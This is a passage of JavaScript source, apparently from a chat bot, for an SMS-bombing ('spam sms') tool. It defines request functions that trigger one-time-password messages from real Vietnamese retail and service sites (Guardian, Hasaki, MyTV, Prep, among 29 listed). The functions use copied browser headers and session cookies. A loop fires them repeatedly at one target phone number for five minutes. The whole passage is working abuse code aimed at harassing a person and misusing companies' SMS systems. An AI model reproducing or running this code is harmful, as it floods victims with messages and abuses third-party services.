cto_bundle=y4u3Y18wbndPQkJOY3ROemlseFd4Vml0aXhLaGh6aFBRNUZoa0tHeW1FJTJCT3NQOEZrUXNQVVVZYTRUeUJYQUhEazFBU3Q3WjRPOUxmN0VLZ2ZFdW5qUVdad3JOVEN2ZFgzZTFpSlFIVTdzdUE4VEhQUUQ4RjBQVkx2SDlsb21tUXBMWm5XWnNPSVVleWslMkI1NWwwTm5oOWMlMkZXb2pTRmU3a3NxcSUyQktlSXB3U2xjVGVWaU9qVDRUaXZ3ZGt0bkg4b0Iwd0RlTVRjSTg2eHQxdnBlWjlGMSUyRmt5WkI0ZyUzRCUzRA; _ga_KPB8TYEK1Z=GS1.1.1738829505.2.1.1738829615.11.0.592342503',
    origin: "https://www.guardian.com.vn",
    priority: "u=1, i",
    referer: "https://www.guardian.com.vn/customer/account/create/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const jsonData = {
    telephone: phone,
  };

  try {
    const response = await axios.post("https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount", jsonData, {
      headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function hasaki(phone) {
  const headers = {
    accept: "*/*",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    cookie:
      "utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; _gid=GA1.2.652687860.1738829977; _gac_UA-79166816-1=1.1738829977.CjwKCAiA2JG9BhAuEiwAH_zf3pnPNIvBM65JRlf1eVBpQfKP0Nmw2i-bKeH7_cKXjtOjgWaBAENAhRoCVkIQAvD_BwE; sessionChecked=1738829976; _gcl_gs=2.1.k1$i1738829975$u140347050; _gcl_au=1.1.310838380.1738829977; __uidac=0167a47099ec1c588d708ab4cb9310b6; __admUTMtime=1738829977; _tt_enable_cookie=1; _ttp=BVQpu7v79cjVFbnW3PS8shoFi6i.tt.1; _fbp=fb.1.1738829978052.184713645238762302; _gcl_aw=GCL.1738829978.CjwKCAiA2JG9BhAuEiwAH_zf3pnPNIvBM65JRlf1eVBpQfKP0Nmw2i-bKeH7_cKXjtOjgWaBAENAhRoCVkIQAvD_BwE; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __iid=7895; __iid=7895; __su=0; __su=0; __RC=5; __R=3; HASAKI_SESSID=3e7356476664b74547b5e1f49727830a; form_key=3e7356476664b74547b5e1f49727830a; PHPSESSID=si6epmhlb0jgtfj5onicaihgnm; __tb=0; __IP=245439842; __uif=__uid%3A1029331692866027066%7C__ui%3A-1%7C__create%3A1732933170; isVisibleModal=1; form_key=3e7356476664b74547b5e1f49727830a; UUID=903ddac2-435c-4ec6-a2a6-bf9bf0dc9d1e; G_ENABLED_IDPS=google; _gat=1; _ga=GA1.1.28964656.1738829977; _ga_MMWZXZ1JWH=GS1.2.1738829978.1.1.1738830119.60.0.0; _ga_40EJN12JB0=GS1.1.1738829978.1.1.1738830140.32.0.0",
    priority: "u=1, i",
    referer: "https://hasaki.vn/customer/account/create",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const jsonData = {
    username: phone,
    accessToken: "",
    cartId: "",
    form_key: "3e7356476664b74547b5e1f49727830a",
  };

  try {
    const response = await axios.get("https://hasaki.vn/wap/v2/customer/account/code", { headers, params: jsonData });
    return response;
  } catch (error) {
    throw error;
  }
}

async function mytv(phone) {
  const headers = {
    Accept: "*/*",
    "Accept-Language": "vi-VN",
    "Content-Type": "application/json",
    Origin: "https://mytv.com.vn",
    Priority: "u=1, i",
    Referer: "https://mytv.com.vn/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    device_model: "Browser",
    device_type: "127",
    email: "",
    login_type: "1",
    phone: phone,
    type: "1",
  };
  const params = {
    uuid: "b8c2ea44-7a42-4baa-a873-1aa8e349ee09",
  };

  try {
    const response = await axios.post("https://apigw.mytv.vn/api/v1/authen-handle/sendOTP", jsonData, {
      headers,
      params,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function prepedu(phone) {
  const headers = {
    Accept: "*/*",
    "Accept-Language": "vi-VN",
    "Content-Type": "application/json",
    Origin: "https://prepedu.com",
    Priority: "u=1, i",
    Referer: "https://prepedu.com/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phone: phone,
  };

  try {
    const response = await axios.post("https://accounts.prep.vn/api/v1/auth/phone-otp/login?", jsonData, { headers });
    return response;
  } catch (error) {
    throw error;
  }
}

const spamSmsFunctions = [
  tv360,
  thepizzacompany,
  medigoapp,
  fptshop,
  vinpearl,
  liena,
  viettelpost,
  vuihoc,
  acheckin,
  pnj,
  viettelLogin,
  viettelReg,
  mochaVideo,
  bestinc,
  moneyveo,
  nhathuoclongchau,
  acfc,
  lottemart,
  fahasa,
  sms30Shine,
  reebok,
  thefaceshop,
  chototReg,
  beautybox,
  vinwonders,
  guardian,
  hasaki,
  mytv,
  prepedu,
];

async function spamSmsOTPByNDQ(api, message, phoneNumber) {
  const logInfo = {
    success: true,
    message: `Đã tiếp nhận lệnh spam sms!\n` + `Tiến hành phát động spam sms đến số điện thoại ${phoneNumber}!`,
  };
  await sendMessageFromSQL(api, message, logInfo, true, 60000);
  const END_TIME = Date.now() + 5 * 60 * 1000; // 5 minutes from now
  while (Date.now() < END_TIME) {
    await Promise.all(
      spamSmsFunctions.map(async (func) => {
        for (let i = 0; i < 10; i++) {
          try {
            const timeoutPromise = new Promise((_, reject) => {
              setTimeout(() => reject(new Error(`Xử lý request sms từ ${func.name} vượt quá 5 giây`)), 5000);
            });
            const result = (async () => await func(phoneNumber))();
            await Promise.race([result, timeoutPromise]);
          } catch (error) {
            // console.error(`SpamSms - Lỗi xảy ra ở hàm ${func.name} (iteration ${i + 1}):`, error.message);
          }
          await new Promise((resolve) => setTimeout(resolve, 3000));
        }
      })
    );
    await new Promise((resolve) => setTimeout(resolve, 30000));
  }
  const result = {
    success: true,
    message: `Thực hiện spam sms đến số điện thoại ${phoneNumber} hoàn tất!`,
  };
  await sendMessageFromSQL(api, message, result, true, 60000);
}
